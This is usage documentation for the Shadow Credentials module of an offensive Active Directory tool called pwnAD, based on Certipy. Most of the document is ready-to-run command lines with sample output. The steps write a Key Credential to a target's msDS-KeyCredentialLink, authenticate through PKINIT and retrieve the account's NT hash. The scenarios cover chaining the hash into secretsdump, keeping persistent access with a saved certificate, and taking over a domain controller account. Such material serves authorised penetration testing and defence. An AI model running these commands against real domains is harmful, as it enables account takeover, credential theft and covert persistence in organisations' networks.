# Shadow Credentials

The `shadow` module implements the Shadow Credentials attack, based on [Certipy](https://github.com/ly4k/Certipy). This attack abuses the `msDS-KeyCredentialLink` attribute to take over accounts.

## Overview

Shadow Credentials allow an attacker to:

1. Add a Key Credential to a target account's `msDS-KeyCredentialLink` attribute
2. Authenticate as that account using PKINIT with the generated certificate
3. Retrieve the account's NT hash
4. Optionally restore the original state

## Requirements

- **Permissions**: Write access to the target's `msDS-KeyCredentialLink` attribute
- **Domain**: AD DS running on Windows Server 2016+ with domain functional level 2016+
- **Infrastructure**: Certificate-based authentication must be available (typically via ADCS)

## Usage

```bash
pwnAD [auth options] shadow <subcommand> [arguments]
```

## Subcommands

| Subcommand | Description |
|------------|-------------|
| `auto` | Full attack chain with automatic cleanup |
| `add` | Add a Key Credential to target |
| `list` | List Key Credentials on target |
| `clear` | Clear all Key Credentials from target |
| `remove` | Remove specific Key Credential by Device ID |
| `info` | Display Key Credential info for Device ID |

## Subcommand Details

### auto

Execute the complete Shadow Credentials attack with automatic cleanup:

1. Save current `msDS-KeyCredentialLink` value
2. Add new Key Credential with generated certificate
3. Use PKINIT to authenticate as target
4. Retrieve NT hash via PAC_CREDENTIAL_INFO
5. Restore original `msDS-KeyCredentialLink` value

```bash
pwnAD [auth] shadow auto <target>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow auto targetuser
[*] Targeting user targetuser
[*] Generating certificate
[*] Adding Key Credential with Device ID: abc12345-...
[*] Authenticating with certificate
[*] Got TGT for targetuser
[*] Retrieving NT hash
[*] Got NThash for targetuser: 31d6cfe0d16ae931b73c59d7e0c089c0
[*] Restoring original msDS-KeyCredentialLink
[*] Cleanup complete
```

### add

Add a Key Credential to the target account. Outputs a PFX file for later use.

```bash
pwnAD [auth] shadow add <target> [-o output.pfx]
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow add targetuser
[*] Targeting user targetuser
[*] Generating certificate
[*] Adding Key Credential with Device ID: abc12345-...
[*] Saved PFX to targetuser.pfx
[*] Device ID: abc12345-...
```

### list

List all Key Credentials associated with an account.

```bash
pwnAD [auth] shadow list <target>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow list targetuser
[*] Targeting user targetuser
[*] Listing Key Credentials for targetuser
[*] DeviceID: abc12345-... | Creation Time (UTC): 2025-02-03 11:13:41
[*] DeviceID: def67890-... | Creation Time (UTC): 2025-01-15 09:30:22
```

### clear

Remove all Key Credentials from an account.

```bash
pwnAD [auth] shadow clear <target>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow clear targetuser
[*] Targeting user targetuser
[*] Clearing all Key Credentials
[*] Successfully cleared msDS-KeyCredentialLink
```

!!! warning
    This removes **all** Key Credentials, including legitimate Windows Hello for Business keys.

### remove

Remove a specific Key Credential by Device ID.

```bash
pwnAD [auth] shadow remove <target> <device_id>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow remove targetuser abc12345-...
[*] Targeting user targetuser
[*] Removing Key Credential with Device ID: abc12345-...
[*] Successfully removed Key Credential
```

### info

Display detailed information about a Key Credential.

```bash
pwnAD [auth] shadow info <target> <device_id>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow info targetuser abc12345-...
[*] Targeting user targetuser
[*] Device ID: abc12345-...
[*] Creation Time: 2025-02-03 11:13:41
[*] Key Usage: NGC
[*] Key Source: AD
```

## Attack Scenarios

### Scenario 1: Account Takeover with Cleanup

The safest approach using `auto`:

```bash
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u compromised_admin -p 'Pass!'

pwnAD [domain.local\compromised_admin]> shadow auto highvalue_target
[*] Got NThash for highvalue_target: aabbccdd...

# Use the hash for further access
pwnAD [domain.local\compromised_admin]> !secretsdump.py -hashes :aabbccdd... domain.local/highvalue_target@192.168.1.10
```

### Scenario 2: Persistent Access

Add a Key Credential for persistent access:

```bash
# Add Key Credential
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow add targetuser

# Later, authenticate with the certificate
pwnAD --dc-ip 192.168.1.10 -d domain.local -pfx targetuser.pfx getTGT
```

### Scenario 3: Computer Account Takeover

Shadow Credentials work on computer accounts too:

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow auto DC01$
[*] Got NThash for DC01$: ...
```

## Cleanup

Always clean up after testing:

```bash
# List credentials first
pwnAD [auth] shadow list targetuser

# Remove specific credential
pwnAD [auth] shadow remove targetuser <device_id>

# Or clear all (careful!)
pwnAD [auth] shadow clear targetuser
```

## Troubleshooting

### "No Key Credentials found"

The target has no `msDS-KeyCredentialLink` entries. This is normal for accounts that haven't used Windows Hello for Business.

### "Access denied"

You don't have write permission to the target's `msDS-KeyCredentialLink` attribute. Check your permissions:

- GenericAll on the target
- GenericWrite on the target
- WriteProperty on msDS-KeyCredentialLink

### "Certificate authentication failed"

The domain may not support PKINIT. Ensure:

- Windows Server 2016+ domain functional level
- Certificate-based authentication is enabled
- ADCS is deployed (or Azure AD joined scenarios)

## References

- [Shadow Credentials - Elad Shamir](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Certipy](https://github.com/ly4k/Certipy)
- [MS-KILE - PAC_CREDENTIAL_INFO](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/)
